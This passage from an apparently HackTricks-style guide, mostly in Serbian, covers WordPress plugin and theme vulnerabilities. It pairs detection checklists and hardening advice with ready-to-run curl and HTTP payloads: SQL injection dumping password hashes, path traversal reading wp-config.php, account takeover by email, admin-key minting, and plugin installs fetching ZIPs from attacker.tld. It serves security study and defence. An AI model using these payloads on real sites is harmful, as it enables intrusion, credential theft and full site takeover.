2. **String concatenation inside the WHERE clause** ‚Äì nema `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** ‚Äì iako se akcija se izvr≈°ava kroz `admin-post.php`, jedina provera je **CSRF nonce** (`wp_verify_nonce()`), koji svaki posetilac mo≈æe dohvatiti sa javne stranice koja ugradi shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. Grab a fresh nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inject arbitrary SQL by abusing `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Odgovor otkriva rezultat ubacÃÅenog upita ili menja bazu podataka, ƒçime se dokazuje SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Drugi zadatak, **downloadcustomfile**, omoguƒáavao je posetiocima da preuzmu **bilo koju datoteku sa diska** putem path traversal-a. Ranljivi sink se nalazi u `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` je pod kontrolom napadaƒça i konkatenira se **bez sanitizacije**. Ponovo, jedino ograniƒçenje je **CSRF nonce** koji se mo≈æe dohvatiti sa resume page.

#### Eksploatacija
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Server odgovara sadr≈æajem `wp-config.php`, leaking DB credentials i auth keys.

## Neautentifikovano preuzimanje naloga preko Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Mnoge teme/plugini isporuƒçuju "social login" helper-e izlo≈æene preko admin-ajax.php. Ako neautentifikovana AJAX akcija (wp_ajax_nopriv_...) veruje identifikatorima koje ≈°alje klijent kada podaci provajdera izostanu, i potom pozove wp_set_auth_cookie(), to postaje full authentication bypass.

Tipiƒçan pogre≈°an obrazac (pojednostavljeno)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider ‚Äì execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // üî• logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Why it‚Äôs exploitable

- Neautentifikovan pristup putem admin-ajax.php (wp_ajax_nopriv_‚Ä¶ action).
- Nema nonce/capability provera pre promene stanja.
- Nedostaje verifikacija OAuth/OpenID provider-a; default branch prihvata unos napadaƒça.
- get_user_by('email', $_POST['id']) praƒáeno wp_set_auth_cookie($uid) autentifikuje zahtevaoca kao bilo koju postojeƒáu email adresu.

Exploitation (unauthenticated)

- Preduslovi: napadaƒç mo≈æe da dosegne /wp-admin/admin-ajax.php i zna/pogaƒëa validan korisniƒçki email.
- Postavite provider na nepodr≈æanu vrednost (ili ga izostavite) da biste u≈°li u default branch i poslali id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- Do not derive identity from client input. Only accept emails/IDs originating from a validated provider token/ID.
- Require CSRF nonces and capability checks even for login helpers; avoid registering wp_ajax_nopriv_ unless strictly necessary.
- Validate and verify OAuth/OIDC responses server-side; reject missing/invalid providers (no fallback to POST id).
- Consider temporarily disabling social login or virtually patching at the edge (block the vulnerable action) until fixed.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ‚â§ 1.0.82)

Some plugins expose REST endpoints that mint reusable ‚Äúconnection keys‚Äù or tokens without verifying the caller‚Äôs capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions ‚Üí RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC ‚Äì mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# ‚Üí {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Why it‚Äôs exploitable
- Osetljiva REST ruta za≈°tiƒáena samo niskom-entropy potvrdom identiteta (username) ili bez permission_callback
- Nema provere capability; generisani kljuƒç se prihvata kao univerzalno zaobila≈æenje

Detection checklist
- Grep-ujte plugin kod za register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Bilo koja ruta koja izdaje tokens/keys bazirane na identitetu dostavljenom u zahtevu (username/email) bez vezivanja za autentifikovanog korisnika ili capability
- Potra≈æite naknadne rute koje prihvataju generisani token/key bez server-side provera capability

Hardening
- Za sve privilegovane REST rute: zahtevati permission_callback koji izvr≈°ava current_user_can() za potrebnu capability
- Ne generi≈°ite long-lived kljuƒçeve iz identity koje dostavi klijent; ako je neophodno, izdajte short-lived, user-bound tokene posle autentikacije i ponovo proverite capability pri upotrebi
- Validirajte korisniƒçki kontekst pozivaoca (wp_set_current_user nije sam po sebi dovoljan) i odbacite zahteve gde !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse ‚Üí unauthenticated arbitrary plugin installation (FunnelKit Automations ‚â§ 3.5.3)

Nonces spreƒçavaju CSRF, ne autorizaciju. Ako kod tretira nonce prolaz kao zeleno svetlo i zatim preskaƒçe provere capability za privilegovane operacije (npr. install/activate plugins), neautentifikovani napadaƒçi mogu zadovoljiti slab zahtev za nonce i dostiƒái RCE instaliranjem backdoored ili ranjivog plugina.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce ‚Äúpasses‚Äù
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers koji menjaju plugins/themes koristeƒái samo wp_verify_nonce()/check_admin_referer() i bez capability check
- Bilo koji code path koji postavlja $skip_caps = true nakon nonce validacije

Hardening
- Uvek tretirajte nonces samo kao CSRF tokens; enforce capability checks bez obzira na stanje nonce-a
- Zahtevati current_user_can('install_plugins') i current_user_can('activate_plugins') pre nego ≈°to se dosegne installer code
- Odbacite neautentifikovan pristup; izbegavajte izlaganje nopriv AJAX actions za privileged flows

### Subscriber+ AJAX plugin installer ‚Üí prisilna maliciozna aktivacija (Motors Theme ‚â§ 5.6.81)

[Patchstack's analysis](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/) je pokazao kako Motors theme isporuƒçuje authenticated AJAX helper za instalaciju svog companion plugina:
```php
add_action('wp_ajax_mvl_theme_install_base', 'mvl_theme_install_base');

function mvl_theme_install_base() {
check_ajax_referer('mvl_theme_install_base', 'nonce');

$plugin_url  = sanitize_text_field($_GET['plugin']);
$plugin_slug = 'motors-car-dealership-classified-listings';

$upgrader = new Plugin_Upgrader(new Motors_Theme_Plugin_Upgrader_Skin(['plugin' => $plugin_slug]));
$upgrader->install($plugin_url);
mvl_theme_activate_plugin($plugin_slug);
}
```
- Samo se poziva `check_ajax_referer()`; ne postoji `current_user_can('install_plugins')` ili `current_user_can('activate_plugins')`.
- Nonce je ugraƒëen u Motors admin stranicu, tako da svaki Subscriber koji mo≈æe da otvori `/wp-admin/` mo≈æe da ga kopira iz HTML/JS.
- Handler veruje parametru `plugin` kontrolisanom od strane napadaƒça (ƒçitano iz `$_GET`) i prosleƒëuje ga u `Plugin_Upgrader::install()`, tako da se proizvoljan remote ZIP preuzima u `wp-content/plugins/`.
- Nakon instalacije, tema bezuslovno poziva `mvl_theme_activate_plugin()`, ≈°to garantuje izvr≈°avanje PHP koda napadaƒçevog plugina.

#### Tok eksploatacije

1. Registrujte/kompromitujte nalog sa niskim privilegijama (Subscriber je dovoljan) i preuzmite `mvl_theme_install_base` nonce iz Motors dashboard UI.
2. Napravite plugin ZIP ƒçiji top-level direktorijum odgovara oƒçekivanom slug-u `motors-car-dealership-classified-listings/` i ubacite backdoor ili webshell u `*.php` entry point-e.
3. Hostujte ZIP i pokrenite installer tako ≈°to ƒáete handler usmeriti na va≈° URL:
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Cookie: wordpress_logged_in_=...
Content-Type: application/x-www-form-urlencoded

action=mvl_theme_install_base&nonce=<leaked_nonce>&plugin=https%3A%2F%2Fattacker.tld%2Fmotors-car-dealership-classified-listings.zip
```
Po≈°to handler ƒçita `$_GET['plugin']`, isti payload se mo≈æe poslati i putem query stringa.

#### Detection checklist

- Pretra≈æite teme/plugine za `Plugin_Upgrader`, `Theme_Upgrader`, ili custom `install_plugin.php` helper-e povezane na `wp_ajax_*` hooks bez capability checks.
- Pregledajte svaki handler koji prihvata parametar `plugin`, `package`, `source`, ili `url` i prosleƒëuje ga u upgrader APIs, posebno kada je slug hard-coded ali sadr≈æaj ZIP-a nije validiran.
- Pregledajte admin stranice koje izla≈æu nonces za installer actions‚Äîako Subscribers mogu uƒçitati stranicu, pretpostavite da nonce leaks.

#### Hardening

- Gate installer AJAX callbacks with `current_user_can('install_plugins')` and `current_user_can('activate_plugins')` after nonce verification; Motors 5.6.82 introduced this check to patch the bug.
- Refuse untrusted URLs: limit installers to bundled ZIPs or trusted repositories, or enforce signed download manifests.
- Treat nonces strictly as CSRF tokens; they do not provide authorization and should never replace capability checks.

---

## Neautentifikovani SQLi via s (search) parameter in depicter-* actions (Depicter Slider ‚â§ 3.6.1)

Vi≈°e depicter-* akcija je koristilo s (search) parametar i spojilo ga u SQL upite bez parameterizacije.

- Parametar: s (search)
- Propust: direktna konkatenacija stringova u WHERE/LIKE klauzulama; nema prepared statements/sanitization
- Uticaj: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep-ujte za depicter-* action handlers i direktnu upotrebu $_GET['s'] ili $_POST['s'] u SQL
- Pregledajte prilagoƒëene upite prosleƒëene $wpdb->get_results()/query() koji konkateniraju s

Hardening
- Uvek koristite $wpdb->prepare() ili wpdb placeholders; odbacite neoƒçekivane metakaraktere na serverskoj strani
- Dodajte strogu listu dozvoljenih vrednosti za s i normalizujte na oƒçekivani charset/du≈æinu

---

## Neautentifikovana Local File Inclusion putem unvalidated template/file path (Kubio AI Page Builder ‚â§ 2.5.1)

Prihvatanje putanja koje kontroli≈°e napadaƒç u template parametru bez normalizacije/ograniƒçenja omoguƒáava ƒçitanje proizvoljnih lokalnih fajlova, i ponekad izvr≈°avanje koda ako su includable PHP/log fajlovi uƒçitani u runtime.

- Parameter: __kubio-site-edit-iframe-classic-template
- Propust: nema normalizacije/strikte liste dozvoljenih; traversal dozvoljen
- Impact: otkrivanje tajni (wp-config.php), potencijalni RCE u specifiƒçnim okru≈æenjima (log poisoning, includable PHP)

PoC ‚Äì proƒçitaj wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Kontrolna lista za detekciju
- Bilo koji handler koji konkatenira putanje zahteva u include()/require()/read sink-ove bez ograniƒçenja pomoƒáu realpath()
- Tra≈æite obrasce traversal-a (../) koji izlaze izvan namenjenog direktorijuma predlo≈æaka

Pojaƒçavanje bezbednosti
- Sprovodite allowlistu predlo≈æaka; re≈°avajte sa realpath() i zahtevajte str_starts_with(realpath(file), realpath(allowed_base))
- Normalizujte ulaz; odbacite traversal sekvence i apsolutne putanje; koristite sanitize_file_name() samo za imena fajlova (ne za cele putanje)


## Reference

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025‚Äôs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ‚â§ 1.0.82 ‚Äì Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ‚â§ 3.5.3 ‚Äì Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ‚â§ 3.6.1 ‚Äì Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ‚â§ 2.5.1 ‚Äì Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)
- [Critical Arbitrary File Upload Vulnerability in Motors Theme Affecting 20k+ Sites](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)

{{#include ../../banners/hacktricks-training.md}}
